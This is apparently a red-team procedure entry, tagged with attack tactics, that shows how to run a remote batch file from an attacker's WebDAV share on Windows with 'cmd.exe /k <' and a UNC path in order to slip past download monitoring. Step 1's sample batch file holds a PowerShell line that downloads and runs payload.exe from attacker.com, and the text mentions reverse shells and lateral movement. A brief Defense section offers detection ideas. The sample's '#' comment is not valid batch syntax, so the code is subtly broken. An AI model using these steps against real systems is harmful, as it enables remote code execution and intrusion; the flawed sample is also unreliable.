---
id: 6e79d5ec-2925-454f-84e9-f4f154a6db3d
name: WebDAV-Batch-File-Execution-via-Cmd
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:26.812256+00:00'
updated_at: '2023-04-10T20:37:09.239654+00:00'
tactics:
  - '[[Execution]]'
  - '[[Defense Evasion]]'
  - '[[Lateral Movement]]'
  - '[[Command and Control]]'
techniques:
  - '[[Remote File Copy]]'
  - '[[Scripting]]'
sub_techniques: []
tags:
  - cmd
  - windows-download-execute
  - webdav
commands:
  - '[[commands/cmd-execute-webdav-batch-file]]'
platforms:
  - Windows
tools: []
validated: true
---

# WebDAV-Batch-File-Execution-via-Cmd

## Summary

This procedure demonstrates how to download and execute a batch file hosted on a WebDAV server directly from the Windows command prompt. It leverages the WebDAV protocol to bypass some download restrictions and execute remote scripts, commonly used in lateral movement or initial payload delivery scenarios.

## Description

WebDAV (Web-based Distributed Authoring and Versioning) allows file access over HTTP, enabling attackers with command prompt access on a Windows target to fetch and run batch files without additional download tools. The technique involves redirecting input to cmd.exe from the remote batch file path, treating it as a script to execute. This is useful in environments where direct downloads are monitored or blocked, as it appears as a simple UNC path access. The target environment is Windows systems with network access to the attacker's WebDAV server. Prerequisites include hosting the batch file on a controllable WebDAV server (e.g., using IIS or Apache with mod_dav). Success results in the batch file executing in the current cmd session, potentially establishing persistence or running further commands.

## Requirements

1. Command prompt access on the target Windows system.
2. Network connectivity from the target to the attacker's WebDAV server.
3. A batch file (.bat or .cmd) uploaded to the WebDAV server with executable content (e.g., malicious commands).
4. WebDAV server configured and accessible via UNC path (\\server\share\file).

## Defense

- Restrict outbound connections to untrusted WebDAV servers using firewall rules or proxy filtering.
- Monitor for anomalous UNC path accesses in Windows event logs (Event ID 5145 for network share access).
- Implement application whitelisting to prevent execution of downloaded scripts.
- Use endpoint detection tools to scan for batch file executions from remote sources.

## Objectives

1. Download a batch file from a remote WebDAV server without using explicit download utilities.
2. Execute the batch file in the current command prompt session to run embedded commands.
3. Achieve code execution for further post-exploitation activities like lateral movement.

## Instructions

### Step 1: Prepare the WebDAV Server and Batch File

**Context**: Before execution, ensure the batch file is hosted on the WebDAV server. This step involves uploading a malicious .bat file containing the desired payload (e.g., downloading additional tools or establishing a reverse shell).

Create a simple batch file example on the server:

```batch
@echo off
echo Batch file executed successfully.
# Add malicious commands here, e.g., powershell -c "Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile payload.exe; ./payload.exe"
```

Upload it to the WebDAV share (e.g., via file explorer or curl to the HTTP endpoint). Verify accessibility by pinging the server or testing the UNC path manually.

### Step 2: Execute the Batch File via Command Prompt

**Context**: From the target system's command prompt, use the UNC path to redirect input to cmd.exe, causing the remote batch file to execute as if local. The /k flag keeps the window open post-execution for observing output or chaining commands.

**Command** ([[commands/cmd-execute-webdav-batch-file]]):
```cmd
cmd.exe /k < \\webdavserver\folder\batchfile.bat
```

> This command opens a new cmd instance, reads the batch file from the WebDAV UNC path, and executes its contents. Replace \\webdavserver\folder\batchfile.bat with the actual path. Expected behavior: The batch file runs, displaying any echo statements or command outputs in the console. If the batch file includes downloads or executions, monitor for file creation or network activity.
